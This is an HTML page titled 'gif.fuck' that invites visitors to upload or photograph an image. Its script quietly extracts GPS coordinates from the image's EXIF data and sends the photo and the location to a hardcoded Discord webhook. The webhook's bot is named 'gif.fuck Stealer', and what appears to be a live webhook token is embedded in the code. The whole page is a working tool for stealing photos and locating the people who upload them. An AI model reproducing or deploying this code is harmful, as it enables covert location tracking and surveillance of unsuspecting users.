<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>gif.fuck</title>
  <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/lite.umd.js"></script>
  <style>
    body {
      margin: 0; padding: 0; height: 100vh;
      background: linear-gradient(135deg, #0f0f0f, #1a0033);
      font-family: 'Segoe UI', sans-serif;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: rgba(255,255,255,0.05);
      padding: 40px;
      border-radius: 20px;
      border: 1px solid rgba(255,255,255,0.1);
      text-align: center;
      width: 420px;
    }
    h1 { font-size: 2.8em; margin: 0 0 30px 0; color: #00ffff; }
    button {
      padding: 16px 32px;
      font-size: 1.1em;
      margin: 10px;
      background: linear-gradient(90deg, #ff00cc, #00ffff);
      border: none;
      border-radius: 50px;
      color: black;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover { transform: scale(1.08); }
    #status { margin-top: 20px; font-size: 1.1em; min-height: 30px; }
  </style>
</head>
<body>
  <div class="container">
    <h1>gif.fuck</h1>
    <button id="uploadBtn">Choose Image</button>
    <button id="cameraBtn">Take Photo</button>
    <div id="status"></div>
  </div>

  <input type="file" id="fileInput" accept="image/*" hidden>
  <input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
    const statusEl = document.getElementById('status');

    function updateStatus(text, color = "white") {
      statusEl.textContent = text;
      statusEl.style.color = color;
    }

    async function sendToWebhook(file, gps = null) {
      const formData = new FormData();
      formData.append("file", file, file.name);

      let content = `New upload: ${file.name}\nSize: ${(file.size/1024/1024).toFixed(2)} MB`;
      if (gps && gps.latitude && gps.longitude) {
        content += `\n\nGPS FOUND\nLat: ${gps.latitude.toFixed(6)}\nLon: ${gps.longitude.toFixed(6)}`;
      }

      formData.append("payload_json", JSON.stringify({
        content: content,
        username: "gif.fuck Stealer"
      }));

      await fetch(WEBHOOK_URL, { method: "POST", body: formData });
    }

    async function handleFile(file) {
      if (!file.type.startsWith("image/")) return;
      updateStatus(`Selected: ${file.name}`, "#00ffff");

      try {
        const gps = await exifr.gps(file);
        await sendToWebhook(file, gps);
        updateStatus("✅ Sent to webhook!", "#00ff00");
      } catch (err) {
        await sendToWebhook(file);
        updateStatus("✅ Sent (no GPS)", "#00ff88");
      }
    }

    // Button clicks
    document.getElementById("uploadBtn").onclick = () => document.getElementById("fileInput").click();
    document.getElementById("cameraBtn").onclick = () => document.getElementById("cameraInput").click();

 document.getElementById("fileInput").onchange = e => handleFile(e.target.files[0]);
document.getElementById("cameraInput").onchange = e => handleFile(e.target.files[0]);
  </script>
</body>
